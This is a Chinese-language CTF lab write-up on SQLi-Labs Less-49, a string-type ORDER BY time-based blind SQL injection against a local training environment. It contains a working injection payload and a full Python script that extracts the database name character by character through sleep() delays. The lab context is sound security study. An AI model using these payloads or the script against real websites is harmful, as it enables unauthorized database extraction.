【SQLi-Labs】Less-49 字符型 ORDER BY 盲注 Writeup

操作者：何芊宏 | 操作日期：2026.10.28 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, ORDER BY注入, 时间盲注, Python自动化

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-49 (GET - Blind Based - String - ORDER BY)
  • 提示：注入点为 sort 参数，字符型闭合（ORDER BY '$id'），无报错、无回显。

2. 核心原理与异常分析

本关卡为字符型 ORDER BY 盲注，需使用单引号闭合并拼接逻辑判断。在实际测试中，若直接在浏览器发起带 sleep(5) 的请求，极易触发 HTTP 500 Internal Server Error。

原因分析：ORDER BY 会对结果集的每一行进行求值。如果全表多次触发长延时，会导致 PHP 脚本执行超时（通常默认 30 秒），Web 服务器会强行切断进程返回 500 错误。

3. 操作步骤与自动化脚本

第一步：手工验证逻辑

在浏览器输入：?sort=1' and if(id=1,sleep(2),0)-- -。页面卡顿约 2 秒，证明通道存在。将延时缩短到 2 秒，可有效避免服务器崩溃。

第二步：编写 Python 自动化脚本

使用 VS Code 编写脚本，采用二分法快速逼近目标字符的 ASCII 码。脚本重点加入异常捕获与边界控制：

import requests
import time

url = "http://localhost/sqli-labs-master/Less-49/"
delay_threshold = 1.5 

def get_ascii(payload, pos):
    low = 32
    high = 126
    while low <= high:
        mid = (low + high) // 2
        # L49 专属构造：单引号闭合 + id=1 限制单次延时
        inject = f"1' and if(id=1, if(ascii(substr(({payload}), {pos}, 1)) > {mid}, sleep(2), 0), 0)-- -"
        
        try:
            start_time = time.time()
            # 设置 timeout 防止服务器彻底卡死
            requests.get(url, params={"sort": inject}, timeout=10)
            end_time = time.time()
            
            if (end_time - start_time) > delay_threshold:
                low = mid + 1
            else:
                high = mid - 1
                
        except requests.exceptions.Timeout:
            # 请求超时视为延时生效（True）
            low = mid + 1
            
    return low

def extract(sql):
    result = ""
    for i in range(1, 50):
        ascii_code = get_ascii(sql, i)
        # 严格边界判断，遇到不可见字符（如空格）直接中断
        if ascii_code <= 32 or ascii_code > 126:
            break
            
        char = chr(ascii_code)
        result += char
        print(f"[+] 发现第 {i} 个字符: {char}，当前结果: {result}")
        
    return result

if __name__ == "__main__":
    print("[*] 开始 L49 时间盲注自动化...")
    db_name = extract("select database()")
    print(f"\n[*] 爆破完成，数据库名为: {db_name}")

代码成分解析：

  • try...except requests.exceptions.Timeout：当服务器因卡顿导致请求超时时，直接判定条件为真（True），继续折半，避免脚本因网络报错而中断。
  • if ascii_code <= 32：解决之前遇到空字符无限循环输出空格的问题。当截取到不存在的字符时，立即跳出循环，保证输出结果的纯净。

执行结果：终端成功打印出 security，无任何报错与冗余输出。

4. 踩坑记录与复盘

  • HTTP 500 超时问题：在编写 ORDER BY 盲注脚本或手工测试时，必须将 sleep() 的时长控制在 2 秒左右，并在脚本中加入超时捕获机制。
  • 边界条件控制：自动化脚本必须包含边界退出逻辑。若只依赖 ascii_code == 0 退出，容易因环境差异陷入空字符死循环。
